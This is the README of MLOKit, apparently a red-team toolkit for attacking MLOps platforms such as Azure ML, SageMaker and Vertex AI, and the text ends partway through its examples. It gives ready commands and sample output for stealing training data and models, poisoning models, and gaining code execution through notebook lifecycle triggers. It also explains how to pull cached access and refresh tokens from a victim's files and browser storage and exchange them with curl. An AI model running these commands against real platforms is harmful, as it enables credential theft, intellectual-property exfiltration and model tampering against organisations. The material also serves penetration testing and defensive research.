# MLOKit

## Description

MLOps Attack Toolkit - MLOKit is a toolkit that can be used to attack MLOps platforms by taking advantage of the available REST API. This tool allows the user to specify an attack module, along with specifying valid credentials for the respective MLOps platform. The attack modules supported include reconnaissance, training data theft, model theft, model poisoning, notebook attacks, training job attacks, and ML compute attacks. MLOKit was built in a modular approach, so that new modules can be added in the future by the information security community.


## Release
* Version 1.3 of MLOKit can be found in Releases

## Table of Contents

- [MLOKit](#MLOKit)
- [Table of Contents](#table-of-contents)
- [Installation/Building](#installationbuilding)
  - [Libraries Used](#libraries-used)
  - [Pre-Compiled](#pre-compiled)
  - [Building Yourself](#building-yourself)
- [Command Modules](#command-modules)
- [Arguments/Options](#argumentsoptions)
- [Authentication Options](#authentication-options)
- [Module Details Table](#module-details-table)
- [Examples](#examples)
  - [Check](#Check)
  - [List Projects/Workspaces](#List-ProjectsWorkspaces)
  - [List Models](#List-Models)
  - [List Datasets](#List-Datasets)
  - [Download Model](#download-model)
  - [Download Dataset](#download-dataset)
  - [Upload Dataset](#upload-dataset)
  - [Poison Model](#poison-model)
  - [List Notebooks](#list-notebooks)
  - [Add Notebook Trigger](#add-notebook-trigger)
  - [List Compute](#list-compute) - **NEW**
  - [List Training Jobs](#list-training-jobs) - **NEW**
  - [Add SSH Key](#add-ssh-key) - **NEW**
  - [Create Training Job](#create-training-job) - **NEW**
  - [Get Training Job Variables](#get-training-job-variables) - **NEW**
  - [Search Training Job Logs](#search-training-job-logs) - **NEW**
  - [List Environments](#list-environments) - **NEW**
  - [Get Environment Configs](#get-environment-configs) - **NEW**
  - [Execute Code within Notebook Instance](#execute-code-within-notebook-instance) - **NEW**
- [Detection](#detection)
- [References](#references)

## Installation/Building

### Libraries Used
The below 3rd party libraries are used in this project.

| Library | URL | License |
| ------------- | ------------- | ------------- |
| Fody  | [https://github.com/Fody/Fody](https://github.com/Fody/Fody) | MIT License  |
| Newtonsoft.Json  | [https://github.com/JamesNK/Newtonsoft.Json](https://github.com/JamesNK/Newtonsoft.Json) | MIT License  |
| AWSSDK.S3  | [https://www.nuget.org/packages/AWSSDK.S3](https://www.nuget.org/packages/AWSSDK.S3)| Apache 2.0 License  |
| AWSSDK.SageMaker  | [https://www.nuget.org/packages/AWSSDK.SageMaker](https://www.nuget.org/packages/AWSSDK.SageMaker)| Apache 2.0 License  |
| AWSSDK.Core  | [https://www.nuget.org/packages/awssdk.core/](https://www.nuget.org/packages/awssdk.core/)| Apache 2.0 License  |
| YamlDotNet  | [https://www.nuget.org/packages/awssdk.core/](https://www.nuget.org/packages/yamldotnet) | MIT License  |

### Pre-Compiled 

* Use the pre-compiled binary in Releases

### Building Yourself

Take the below steps to setup Visual Studio in order to compile the project yourself. This requires two .NET libraries that can be installed from the NuGet package manager.

* Load the Visual Studio project up and go to "Tools" --> "NuGet Package Manager" --> "Package Manager Settings"
* Go to "NuGet Package Manager" --> "Package Sources"
* Add a package source with the URL `https://api.nuget.org/v3/index.json`
* Install the Costura.Fody NuGet package. 
  * `Install-Package Costura.Fody -Version 3.3.3`
* Install the Newtonsoft.Json package
  * `Install-Package Newtonsoft.Json`
* Install required AWS SDK packages
  * `Install-Package AWSSDK.S3 -Version 3.7.412.4`
  * `Install-Package AWSSDK.SageMaker -Version 3.7.421.3`
* You can now build the project yourself!

## Command Modules

* **check** - Check whether credentials provided are valid
* **list-projects** - List the available projects
* **list-models** - List the available ML models
* **list-datasets** - List the available training datasets
* **download-model** - Download a given ML model
* **download-dataset** - Download a given training dataset
* **upload-dataset** - Upload a training dataset
* **poison-model** - Poison a given ML model
* **list-notebooks** - List the available notebook instances
* **add-notebook-trigger** - Add a notebook trigger for code execution
* **list-compute** - List the available ML compute instances
* **list-training-jobs** - List the training jobs that have run
* **add-ssh-key** - Add public SSH key to ML compute
* **create-training-job** - Create an ML training job with code specified
* **get-training-job-vars** - Get all training jobs that have any variables present (could contain credentials)
* **search-training-job-logs** - Searching training job logs for a given search string (could contain credentials)
* **list-environments** - List available environments
* **get-environment-configs** - Download Docker build files for environments (could contain credentials)
* **exec-notebook-code** - Execute code within a JupyterLab environment within a notebook instance


## Arguments/Options

### Globally Required Arguments

The below arguments are required for all command modules.

* **/credential:** - Credential for authentication. Applicable to all modules
  * API Key - `abcdefg123123`
  * Access Token - `eyJ...`
  * Access Key & Secret Key - `ABCABC;123456789`
  * Username/Password - `user;Password!`
* **/platform:** - MLOps Platform. Applicable to all modules. Supported MLOps platforms listed below.
  * Azure ML - `azureml`
  * BigML - `bigml`
  * Google Cloud Vertex AI - `vertexai`
  * MLFlow - `mlflow`
  * Amazon SageMaker - `sagemaker`

### Optional Arguments/Dependent on Platform and Module

* **/subscription-id:** - Applicable to `azureml` platform only. Only applies to some command modules.
* **/resource-group:** - Applicable to `azureml` platform only. Only applies to some command modules.
* **/workspace:** - Applicable to `azureml` platform only. Only applies to some command modules.
* **/region:** - Applicable to `azureml` and `sagemaker` platforms only. Only applies to some command modules.
* **/project:** - Applicable to `vertexai` platform only. Only applies to some command modules.
* **/model-id:** - Applicable to all platforms. Only applies to some command modules.
* **/dataset-id:** - Applicable to all platforms. Only applies to some command modules.
* **/url:** - Applicable to `mlflow` platform only. Only applies to some command modules.
* **/source-dir:** - Applicable to `azureml`, `sagemaker`, and `palantir` platforms only. Only applies to some command modules.
* **/dataset-name:** - Applicable to `palantir` platform only. Only applies to upload-dataset command module.
* **/notebook-name:** - Applicable to `sagemaker` platform only. Only applies to some command modules.
* **/script:** - Applicable to `sagemaker` platform only. Only applies to one command module.
* **/compute-id:** - Applicable to `azureml` platform only. Only applies to some command modules.
* **/ssh-key:** - Applicable to `azureml` platform only. Only applies to some command modules.
* **/training-job-config:** - Applicable to `azureml` platform only. Only applies to some command modules.
* **/job-name:** - Applicable to `azureml` platform only. Only applies to some command modules.
* **/search:** - Applicable to `azureml` platform only. Only applies to some command modules.
* **/environment-name:** - Applicable to `azureml` platform only. Only applies to some command modules.



## Authentication Options

Below are the authentication options you have with MLOKit when authenticating to a supported MLOps platform. You would provide this credential material in the `/credential:` argument.

### Access Token

#### Azure ML

There are multiple methods that can be used to obtain an access token for Azure ML. Once you have obtained an access token, you can use it to authenticate to Azure ML with MLOKit. Some of these methods will be highlighted below.

##### Azure CLI

If you have compromised user Entra ID credentials and can login via the Azure CLI, enter the below command to obtain an access token.

`az account get-access-token --subscription [SUBSCRIPTION_ID]`

##### Refresh Token on File System

On the file system there is a file located at `%USERPROFILE%\.azure\msal_http_cache.bin` that can contain a refresh token for an authenticated user. You can obtain all required information from this file, such as the client ID, refresh token, and tenant ID, and then run the below command to get an access token.

`curl --request POST --data "client_id=[CLIENT_ID]&refresh_token=[REFRESH_TOKEN]&grant_type=refresh_token" "https://login.microsoftonline.com/[TENANT_ID]/oauth2/v2.0/token"`

##### Access Token on File System

If a user has authenticated to Azure ML via a Chromium browser, such as Microsoft Edge or Google Chrome, there will be a log file at one of the below locations that contains an access token in cleartext. Within the log file, search for the key of `secret`, which can contain the access token value.

| Browser    | File Path |
| -------- | ------- |
| Chrome  | `%LOCALAPPDATA%\Google\Chrome\User Data\Default\Local Storage\leveldb\*.log`    |
| Edge | `%LOCALAPPDATA%\Microsoft\Edge\User Data\Default\Local Storage\leveldb\*.log`     |


#### Vertex AI

There are multiple methods that can be used to obtain an access token for Vertex AI. Once you have obtained an access token, you can use it to authenticate to Vertex AI with MLOKit. Some of these methods will be highlighted below.

##### Access Token SQLite Database

When a user authenticates with the Google Cloud CLI, an access token is obtained and logged in a SQLite database at the below file location. Within the SQLite database there will be information such as the account id, access token, and token expiry.

| Operating System    | File Path |
| -------- | ------- |
| Windows  | `%APPDATA%\gcloud\access_tokens.db`    |
| Linux | `~/.config/gcloud/access_tokens.db`     |

##### Google Cloud CLI

If you have compromised Google Cloud user credentials and can login via the Google Cloud CLI, enter the below command to obtain an access token.

`gcloud auth print-access-token`

If you are logging in via ADC as a user in the Google Cloud CLI, you would run the below command to get an access token.

`gcloud auth application-default print-access-token`

##### Refresh Token from Legacy Credentials

On the file system, there are files located at the below file locations that can contain a refresh token for an authenticated user. 

| Operating System    | File Path |
| -------- | ------- |
| Windows  | `%APPDATA%\gcloud\legacy_credentials\[USER]`    |
| Linux | `~/.config/gcloud/legacy_credentials/[USER]`     |

You can obtain all required information from this file, such as the client ID, client secret, and refresh token, and then run the below command to get an access token.

`curl --request POST --data "client_id=[CLIENT_ID]&client_secret=[CLIENT_SECRET]&refresh_token=[REFRESH_TOKEN]&grant_type=refresh_token" "https://accounts.google.com/o/oauth2/token"`


### API Key

#### BigML

API key is alphanumeric and is provided as a GET variable name of `api_key=`.

### Bearer Token

#### Palantir AIP

For Palantir AIP authentication, you need a Bearer token and tenant URL. The App RID is **optional** - if not provided, MLOKit will automatically discover datasets using the Spaces API. Within the `/credential:` argument, provide these values separated by `;`.

**With App RID (targeted discovery):**
`/credential:eyJwbG50ciI6...;tenant.palantirfoundry.com;ri.compass.main.folder.abc123`

**Without App RID (automatic Spaces API discovery):**
`/credential:eyJwbG50ciI6...;tenant.palantirfoundry.com`

You can obtain these values from:

* **Token**: From your Palantir AIP authentication session or API tokens
* **Tenant**: Your Palantir Foundry tenant URL (without https://)
* **App RID** *(Optional)*: The Resource Identifier of the App/folder containing your datasets. If not provided, MLOKit will automatically discover datasets across all accessible spaces and projects using the Spaces API.

### Access Key and Secret Access Key

####  SageMaker

This only applies to SageMaker. Within the `/credential:` argument provide your `ACCESS_KEY` and `SECRET_ACCESS_KEY` separate by a `;`. For example `/credential:ABC123;AAAFDSKAFLKASDFJSAF`.

## Palantir Dataset Discovery Methods

MLOKit supports two discovery methods for Palantir AIP datasets:

### Targeted Discovery (App RID)

When you provide an App RID in your credentials (`token;tenant;apprid`), MLOKit will:

* Explore datasets within the specified App folder
* Recursively search subfolders up to 3 levels deep
* Filter out example content automatically
* Provide faster, focused results

### Automatic Discovery (Spaces API)

When you omit the App RID (`token;tenant`), MLOKit will:

* Query the Spaces API to discover all accessible spaces and projects
* Recursively explore each space for datasets up to 4 levels deep
* Automatically filter out example and demo content
* Provide comprehensive tenant-wide dataset discovery
* Remove duplicate datasets found across multiple spaces

**Note:** The automatic discovery method may take longer but provides broader coverage when you don't have a specific App RID or want to discover all accessible datasets.

## Module Details Table

The below table shows where each module is supported

Module  | Azure ML (`azureml`) | BigML (`bigml`) | Vertex AI (`vertexai`) | MLFlow (`mlflow`) | Sagemaker (`sagemaker`) | Palantir (`palantir`)
:---: |:---: | :---: | :---:  | :---:  | :---: | :---:
`check` | X | X | X | X | X | X
`list-projects` | X | X | X | | | 
`list-models` | X | X | X | X | X | 
`list-datasets` | X | X | X | | | X
`download-model` | X | X | X | X | X | 
`download-dataset` | X | X | X | | | X
`upload-dataset` | | | | | | X
`poison-model` | X |  |  | | X | 
`list-notebooks` | X |  |  | | X | 
`add-notebook-trigger` |  |  |  | | X | 
`list-compute` | X |  |  | |  | 
`list-training-jobs` | X |  |  | | X | 
`add-ssh-key` | X |  |  | |  |
`create-training-job` | X |  |  | |  |
`get-training-job-vars` | X |  |  | | X  |
`search-training-job-logs` | X |  |  | |  |
`list-environments` | X |  |  | |  |
`get-environment-config` | X |  |  | |  |
`exec-notebook-code` | X |  |  | | X  |



## Examples

### Check

#### Use Case

> *Check whether the supplied credentials are valid to a given MLOps platform*

#### Syntax

Supply the `check` module, along with the MLOps platform in the `/platform:` command argument. Additionally, provide a credential in the `/credential:` command argument. The output of this command will inform you whether the credentials you provided are valid.

##### Azure ML

`MLOKit.exe check /platform:azureml /credential:eyJ...`

##### BigML

`MLOKit.exe check /platform:bigml /credential:username;apiKey`

##### Vertex AI

`MLOKit.exe check /platform:vertexai /credential:ya29..`

##### MLFlow

For the `mlflow` platform, you will also have to provide a URL in the `/url:` command argument.

`MLOKit.exe check /platform:mlflow /credential:username;password /url:http://MLFLOW_URL`

##### SageMaker

`MLOKit.exe check /platform:sagemaker /credential:access_key;secret_key /region:[REGION_NAME]`

##### Palantir

**With App RID (targeted discovery):**
`MLOKit.exe check /platform:palantir /credential:token;tenant;apprid`

**Without App RID (automatic Spaces API discovery):**
`MLOKit.exe check /platform:palantir /credential:token;tenant`

##### Example Output

```
C:\>MLOKit.exe check /platform:azureml /credential:eyJ0...

==================================================
Module:         check
Platform:       azureml
Timestamp:      4/7/2024 2:09:59 PM
==================================================


[*] INFO: Performing check module for azureml


[*] INFO: Checking credentials provided

[+] SUCCESS: Credentials provided are VALID.


[*] INFO: Listing subscriptions user has acess to

                                              Name |                          Subscription ID |               Status
--------------------------------------------------------------------------------------------------------------------
                               Some Subscription 1 |     aaaaaaaa-1111-1111-aaaa-aaaaaaaaaaaa |              Enabled
                               Some Subscription 2 |     bbbbbbbb-2222-2222-bbbb-bbbbbbbbbbbb |              Enabled
                               Some Subscription 3 |     cccccccc-3333-3333-cccc-cccccccccccc |             Disabled
                               Some Subscription 4 |     dddddddd-4444-4444-dddd-dddddddddddd |             Disabled

```

### List Projects/Workspaces

#### Use Case

> *List all AI/ML projects you have access to.*

#### Syntax

Supply the `list-projects` module, along with the MLOps platform in the `/platform:` command argument. Additionally, provide a credential in the `/credential:` command argument. The output of this command will list the AI/ML projects that you have access to.

##### Azure ML

For the `azureml` platform, you will also have to provide a subscription ID in the `/subscription-id:` command argument.

`MLOKit.exe list-projects /platform:azureml /credential:eyJ... /subscription-id:[someSubscriptionID]`

##### BigML

`MLOKit.exe list-projects /platform:bigml /credential:username;apiKey`

##### Vertex AI

`MLOKit.exe list-projects /platform:vertexai /credential:ya29..`

##### Example Output

```
C:\>MLOKit.exe list-projects /platform:vertexai /credential:ya29...

==================================================
Module:         list-projects
Platform:       vertexai
Timestamp:      4/7/2024 2:14:55 PM
==================================================


[*] INFO: Performing list-projects module for vertexai


[*] INFO: Checking credentials provided

[+] SUCCESS: Credentials provided are VALID.

                          Name |                     Project ID |       Project Number | Project State |                  Creation Date
---------------------------------------------------------------------------------------------------------------------------------------
              My Project 98785 |            sigma-lyceum-419319 |         105931367384 |        ACTIVE |            4/4/2024 7:11:16 PM
              My First Project |            coral-marker-414313 |          67870862563 |        ACTIVE |           2/14/2024 1:58:57 PM

```

### List Models

#### Use Case

> *List all ML models that you have access to.*

#### Syntax

Supply the `list-models` module, along with the MLOps platform in the `/platform:` command argument. Additionally, provide a credential in the `/credential:` command argument. The output of this command will list the ML models that you have access to.

##### Azure ML

For the `azureml` platform, you will also have to provide a subscription ID in the `/subscription-id:` command argument. Additionally, you will need to provide a region, resource group and workspace to list models from in the `/region:`, `/resource-group:`, and `/workspace:` command arguments respectively.

`MLOKit.exe list-models /platform:azureml /credential:eyJ... /subscription-id:[someSubscriptionID] /region:[REGION] /resource-group:[RESOURCE_GROUP] /workspace:[WORKSPACE_NAME]`

##### BigML

`MLOKit.exe list-models /platform:bigml /credential:username;apiKey`

##### Vertex AI

For the `vertexai` platform, you will also have to provide a project in the `/project:` command argument.

`MLOKit.exe list-models /platform:vertexai /credential:ya29.. /project:[PROJECT_NAME]`

##### MLFlow

For the `mlflow` platform, you will also have to provide a URL in the `/url:` command argument.

`MLOKit.exe list-models /platform:mlflow /credential:username;password /url:http://MLFLOW_URL`

##### SageMaker

`MLOKit.exe list-models /platform:sagemaker /credential:access_key;secret_key /region:[REGION_NAME]`

##### Example Output

```
C:\>MLOKit.exe list-models /platform:bigml /credential:username;apiKey

==================================================
Module:         list-models
Platform:       bigml
Timestamp:      4/7/2024 2:21:54 PM
==================================================


[*] INFO: Performing list-models module for bigml


[*] INFO: Checking credentials provided

[+] SUCCESS: Credentials provided are VALID.

                                    Name | Visibility |           Created By |        Creation Date |          Update Date |                       Model ID |        Associated Project (ID) |        Associated Dataset (ID)
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
                               bank-full |    Private |        brett_hawkins |  4/3/2024 8:35:05 PM |  4/3/2024 8:35:10 PM |       660dbd79b47e654209bbb4c5 |       65ca4513a0a683376c351374 |       660dbc57ff7b592f2d19ec2d
        taxi-fare-train-UPDATED [merged] |    Private |        brett_hawkins | 2/12/2024 5:06:03 PM |  4/3/2024 8:35:10 PM |       65ca4ffbbd37cab02319ee58 |       65ca4513a0a683376c351374 |       65ca4f25dcb2364267a31612
```

### List Datasets

#### Use Case

> *List all training datasets that you have access to.*

#### Syntax

Supply the `list-datasets` module, along with the MLOps platform in the `/platform:` command argument. Additionally, provide a credential in the `/credential:` command argument. The output of this command will list the training datasets that you have access to.

##### Azure ML

For the `azureml` platform, you will also have to provide a subscription ID in the `/subscription-id:` command argument. Additionally, you will need to provide a region, resource group and workspace to list datasets from in the `/region:`, `/resource-group:`, and `/workspace:` command arguments respectively.

`MLOKit.exe list-datasets /platform:azureml /credential:eyJ... /subscription-id:[someSubscriptionID] /region:[REGION] /resource-group:[RESOURCE_GROUP] /workspace:[WORKSPACE_NAME]`

##### BigML

`MLOKit.exe list-datasets /platform:bigml /credential:username;apiKey`

##### Vertex AI

For the `vertexai` platform, you will also have to provide a project in the `/project:` command argument.

`MLOKit.exe list-datasets /platform:vertexai /credential:ya29.. /project:[PROJECT_NAME]`

##### Palantir

**With App RID (targeted discovery):**
`MLOKit.exe list-datasets /platform:palantir /credential:token;tenant;apprid`

**Without App RID (automatic Spaces API discovery):**
`MLOKit.exe list-datasets /platform:palantir /credential:token;tenant`

##### Example Output

```
C:\>MLOKit.exe list-datasets /platform:vertexai /credential:ya29... /project:coral-marker-414313

==================================================
Module:         list-datasets
Platform:       vertexai
Timestamp:      4/7/2024 2:17:11 PM
==================================================


[*] INFO: Checking credentials provided

[+] SUCCESS: Credentials provided are VALID.


[*] INFO: Listing regions for the coral-marker-414313 project

asia-east1
asia-northeast1
australia-southeast1
europe-west1
europe-west2
global
us-central1
us-east1
us-east4
us-west2
us-west3
us-west4
us-west4
                          Name |           Dataset ID |                  Creation Date |                    Update Date |          Region |                                                    File Path
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
                bank-marketing |  4622581079147020288 |           2/14/2024 6:14:36 PM |          3/21/2024 12:47:35 PM |     us-central1 | gs://cloud-ai-platform-18195e29-682d-4d93-b7ee-e5c514f8eadd/dataset1-name.csv
            some-other-dataset |  5504207985204789248 |            4/5/2024 1:58:00 PM |            4/5/2024 1:59:23 PM |        us-east1 | gs://cloud-ai-platform-a8faba59-2fce-4cc5-a5bf-147742ac309d/someFolder/some-other-dataset-blah.csv

```

### Download Model

#### Use Case

> *Download a given ML model and its associated files and assets.*

#### Syntax

Supply the `download-model` module, along with the MLOps platform in the `/platform:` command argument. Additionally, provide a credential in the `/credential:` command argument and a model ID in the `/model-id:` command argument. The correlating model files will be downloaded to your current working directory.

##### Azure ML

For the `azureml` platform, you will also have to provide a subscription ID in the `/subscription-id:` command argument. Additionally, you will need to provide a region, resource group, workspace and model ID to download a model from in the `/region:`, `/resource-group:`, `/workspace:`, and `/model-id:` command arguments respectively.

`MLOKit.exe download-model /platform:azureml /credential:eyJ... /subscription-id:[someSubscriptionID] /region:[REGION] /resource-group:[RESOURCE_GROUP] /workspace:[WORKSPACE_NAME] /model-id:[MODEL_ID]`

##### BigML

`MLOKit.exe download-model /platform:bigml /credential:username;apiKey /model-id:[MODEL_ID]`

##### Vertex AI

For the `vertexai` platform, you will also have to provide a project in the `/project:` command argument.

`MLOKit.exe download-model /platform:vertexai /credential:ya29.. /project:[PROJECT_NAME] /model-id:[MODEL_ID]`

##### MLFlow

For the `mlflow` platform, you will also have to provide a url in the `/url:` command argument.

`MLOKit.exe download-model /platform:mlflow /credential:admin;password /url:http://[MLFLOW_URL] /model-id:[MODEL_ID]`

##### SageMaker

`MLOKit.exe download-model /platform:sagemaker /credential:access_key;secret_key /region:[REGION_NAME] /model-id:[MODEL_ID]`

##### Example Output

```
C:\>MLOKit.exe download-model /platform:bigml /credential:username;apiKey /model-id:660dbd79b47e654209bbb4c5

==================================================
Module:         download-model
Platform:       bigml
Timestamp:      4/7/2024 2:23:02 PM
==================================================


[*] INFO: Performing download-model module for bigml


[*] INFO: Checking credentials provided

[+] SUCCESS: Credentials provided are VALID.


[*] INFO: Downloading model in PMML format with ID 660dbd79b47e654209bbb4c5 to the current working directory of C:\Temp


[+] SUCCESS: Model written to: C:\Temp\MLOKit-mcqTmrDH.xml

```

### Download Dataset

#### Use Case

> *Download a given training dataset*

#### Syntax

Supply the `download-dataset` module, along with the MLOps platform in the `/platform:` command argument. Additionally, provide a credential in the `/credential:` command argument. The correlating dataset file will be downloaded to your current working directory.

##### Azure ML

For the `azureml` platform, you will also have to provide a subscription ID in the `/subscription-id:` command argument. Additionally, you will need to provide a region, resource group, workspace and dataset ID to download a dataset from in the `/region:`, `/resource-group:`, `/workspace:`, and `/dataset-id:` command arguments respectively.

`MLOKit.exe download-dataset /platform:azureml /credential:eyJ... /subscription-id:[someSubscriptionID] /region:[REGION] /resource-group:[RESOURCE_GROUP] /workspace:[WORKSPACE_NAME] /dataset-id:[DATASET_ID]`

##### BigML

For the `bigml` platform, you will also have to provide a dataset ID in the `/dataset-id:` command argument.

`MLOKit.exe download-dataset /platform:bigml /credential:username;apiKey /dataset-id:[DATASET_ID]`

##### Vertex AI

For the `vertexai` platform, you will also have to provide a project name in the `/project:` command argument and a dataset ID in the `/dataset-id:` command argument.

`MLOKit.exe download-dataset /platform:vertexai /credential:ya29.. /project:[PROJECT_NAME] /dataset-id:[DATASET_ID]`

##### Palantir

For the `palantir` platform, you will need to provide a dataset RID in the `/dataset-id:` command argument.

**With App RID (targeted discovery):**
`MLOKit.exe download-dataset /platform:palantir /credential:token;tenant;apprid /dataset-id:[DATASET_RID]`

**Without App RID (automatic Spaces API discovery):**
`MLOKit.exe download-dataset /platform:palantir /credential:token;tenant /dataset-id:[DATASET_RID]`

##### Example Output

```
C:\>MLOKit.exe download-dataset /platform:vertexai /credential:ya29... /project:coral-marker-414313 /dataset-id:5504207985204789248

==================================================
Module:         download-dataset
Platform:       vertexai
Timestamp:      4/7/2024 2:19:23 PM
==================================================


[*] INFO: Checking credentials provided

[+] SUCCESS: Credentials provided are VALID.


[*] INFO: Getting all regions for the coral-marker-414313 project


[*] INFO: Getting mediaLink for gs://cloud-ai-platform-18195e29-682d-4d93-b7ee-e5c514f8eadd/dataset1-name.csv


[+] SUCCESS: Dataset written to: C:\Temp\MLOKit-nKBqOWLO

```

### Upload Dataset

#### Use Case

> *Upload a training dataset to the Palantir platform*

#### Syntax

Supply the `upload-dataset` module, along with the MLOps platform in the `/platform:` command argument. Additionally, provide a credential in the `/credential:` command argument, a dataset name in the `/dataset-name:` command argument, and the local file path in the `/source-dir:` command argument. The dataset file will be uploaded to your Palantir tenant.

##### Palantir

For the `palantir` platform, you will need to provide a dataset name in the `/dataset-name:` command argument and the path to your local dataset file in the `/source-dir:` command argument.

**With App RID (targeted upload):**
`MLOKit.exe upload-dataset /platform:palantir /credential:token;tenant;apprid /dataset-name:[DATASET_NAME] /source-dir:[LOCAL_FILE_PATH]`

**Without App RID (upload to default location):**
`MLOKit.exe upload-dataset /platform:palantir /credential:token;tenant /dataset-name:[DATASET_NAME] /source-dir:[LOCAL_FILE_PATH]`

##### Example Output

```
C:\>MLOKit.exe upload-dataset /platform:palantir /credential:token;tenant /dataset-name:customer-data /source-dir:C:\data\customers.csv

==================================================
Module:         upload-dataset
Platform:       palantir
Timestamp:      8/11/2025 2:30:15 PM
==================================================


[*] INFO: Performing upload-dataset module for palantir


[*] INFO: Checking credentials provided

[+] SUCCESS: Credentials provided are VALID.


[*] INFO: Uploading dataset file: C:\data\customers.csv


[*] INFO: Creating dataset with name: customer-data


[+] SUCCESS: Dataset uploaded successfully with RID: ri.compass.main.dataset.abc123def456


[*] INFO: Dataset available at: https://tenant.palantirfoundry.com/workspace/dataset/ri.compass.main.dataset.abc123def456

```

### Poison Model

#### Use Case

> *Poison a given ML model by overwriting its model artifacts*

#### Syntax

Supply the `poison-model` module, along with the MLOps platform in the `/platform:` command argument. Additionally, provide a credential in the `/credential:` command argument and a model ID in the `/model-id:` command argument. Finally, supply the `/source-dir:` argument with the directory on your attacker machine that contains the poisoned model files.

##### Azure ML

For the `azureml` platform, you will also have to provide a subscription ID in the `/subscription-id:` command argument. Additionally, you will need to provide a region, resource group and workspace in the `/region:`, `/resource-group:` and `/workspace:` command arguments respectively.

`MLOKit.exe poison-model /platform:azureml /credential:eyJ... /subscription-id:[someSubscriptionID] /region:[REGION] /resource-group:[RESOURCE_GROUP] /workspace:[WORKSPACE_NAME] /model-id:[MODEL_ID] /source-dir:[LOCAL_PATH_TO_FILES]`

##### SageMaker

`MLOKit.exe poison-model /platform:sagemaker /credential:access_key;secret_key /region:[REGION_NAME] /model-id:[MODEL_ID] /source-dir:[LOCAL_PATH_TO_FILES]`

##### Example Output

```

C:\>MLOKit.exe poison-model /platform:sagemaker /credential:access_key;secret_key /region:us-east-2 /model-id:employee-salary-model /source-dir:C:\Demo\MLOKit-OiEJQGbz

==================================================
Module:         poison-model
Platform:       sagemaker
Timestamp:      1/25/2025 9:39:00 PM
==================================================


[*] INFO: Performing poison-model module for sagemaker

[*] INFO: Checking credentials provided

[+] SUCCESS: Credentials are valid

                                        Model Name |        Creation Date |                                          Model ARN
------------------------------------------------------------------------------------------------------------------------------
                             employee-salary-model |            1/22/2025 | arn:aws:sagemaker:[REGION]:[ACCOUNT_ID]:model/employee-salary-model

[*] INFO: Model artifacts location

s3://[BUCKET_NAME]/Canvas/default-20250121T171825/Training/output/Canvas1737498359380/sagemaker-automl-candidates/model/Canvas1737498359380-trial-t1-1/model.tar.gz

[*] INFO: Checking access to S3 bucket with name: [BUCKET_NAME]

[+] SUCCESS: You have access to S3 bucket with name: [BUCKET_NAME]

[*] INFO: Listing prefix where files will be uploaded: Canvas/default-20250121T171825/Training/output/Canvas1737498359380/sagemaker-automl-candidates/model/Canvas1737498359380-trial-t1-1/

[*] INFO: Listing files in source directory that will be uploaded

model.tar.gz

[+] SUCCESS: model.tar.gz written to:
[BUCKET_NAME]/Canvas/default-20250121T171825/Training/output/Canvas1737498359380/sagemaker-automl-candidates/model/Canvas1737498359380-trial-t1-1/model.tar.gz

```

### List Notebooks

#### Use Case

> *List available notebook instances*

#### Syntax

Supply the `list-notebooks` modules, along with the MLOps platform in the `/platform:` command argument.  Additionally, provide a credential in the `/credential:` command argument.

##### Azure ML

`MLOKit.exe list-notebooks /platform:azureml /credential:[CREDENTIAL] /subscription-id:[SUBSCRIPTION_ID] /region:[REGION] /resource-group:[RESOURCE_GROUP] /workspace:[WORKSPACE_NAME]`

##### SageMaker

`MLOKit.exe list-notebooks /platform:sagemaker /credential:[ACCESS_KEY;SECRET_KEY] /region:[REGION_NAME]`

##### Example Output

```

C:\>MLOKit.exe list-notebooks /platform:sagemaker /credential:access_key;secret_key /region:us-east-2

==================================================
Module:         list-notebooks
Platform:       sagemaker
Timestamp:      1/28/2025 12:59:20 PM
==================================================


[*] INFO: Performing list-notebooks module for sagemaker

[*] INFO: Checking credentials provided

[+] SUCCESS: Credentials are valid

                                     Notebook Name |        Creation Date |      Notebook Status |      Notebook Lifecycle Config
---------------------------------------------------------------------------------------------------------------------------------
                               brett-test-notebook |            1/28/2025 |            InService |                

```

### Add Notebook Trigger

#### Use Case

> *Add a trigger for a given notebook to gain code execution*

#### Syntax

Supply the `add-notebook-trigger ` modules, along with the MLOps platform in the `/platform:` command argument.  Additionally, provide a credential in the `/credential:` command argument and a notebook to target in the `/notebook-name:` argument. Finally, add a path to a script file you would like to execution within the notebook environment cloud compute via the `/script:` command argument.


##### SageMaker

`MLOKit.exe add-notebook-trigger /platform:sagemaker /credential:[ACCESS_KEY;SECRET_KEY] /region:[REGION_NAME] /notebook-name:[NOTEBOOK_NAME] /script:[PATH_TO_SCRIPT]`

##### Example Output

```

C:\>MLOKit.exe add-notebook-trigger /platform:sagemaker /credential:access_key;secret_key /region:us-east-2 /notebook-name:brett-test-notebook /script:C:\Demo\test.sh

==================================================
Module:         add-notebook-trigger
Platform:       sagemaker
Timestamp:      1/28/2025 12:50:20 PM
==================================================


[*] INFO: Performing add-notebook-trigger module for sagemaker

[*] INFO: Checking credentials provided

[*] INFO: Creating notebook instance lifecycle config

[+] SUCCESS: Notebook instance lifecycle config created with name: MLOKit-TdXhtHNc

[*] INFO: Stopping target notebook instance with name: brett-test-notebook

                                     Notebook Name |        Creation Date |      Notebook Status |      Notebook Lifecycle Config
---------------------------------------------------------------------------------------------------------------------------------
                               brett-test-notebook |            1/28/2025 |             Stopping |

[*] INFO: Sleeping for 2 minutes to allow time for notebook to stop

[+] SUCCESS: Notebook instance with name of brett-test-notebook has been stopped successfully.

[*] INFO: Updated notebook named brett-test-notebookwith lifecycle config with name MLOKit-TdXhtHNc

                                     Notebook Name |        Creation Date |      Notebook Status |      Notebook Lifecycle Config
---------------------------------------------------------------------------------------------------------------------------------
                               brett-test-notebook |            1/28/2025 |             Updating |

[*] INFO: Sleeping for 2 minutes to allow time for notebook instance lifecycle config to be assigned

[+] SUCCESS: Malicious notebook instance lifecycle config assigned to notebook with name: brett-test-notebook

[*] INFO: Starting target notebook instance with name: brett-test-notebook

                                     Notebook Name |        Creation Date |      Notebook Status |      Notebook Lifecycle Config
---------------------------------------------------------------------------------------------------------------------------------
                               brett-test-notebook |            1/28/2025 |              Pending |                MLOKit-TdXhtHNc

[*] INFO: Sleeping for 2 minutes to allow time for notebook to start

[+] SUCCESS: Successfully started notebook with name: brett-test-notebook

```

### List Compute

#### Use Case

> *List the available compute instances*

#### Syntax

Supply the `list-compute` module, along with the MLOps platform in the `/platform:` command argument. Additionally, provide a credential in the `/credential:` command argument.

##### Azure ML

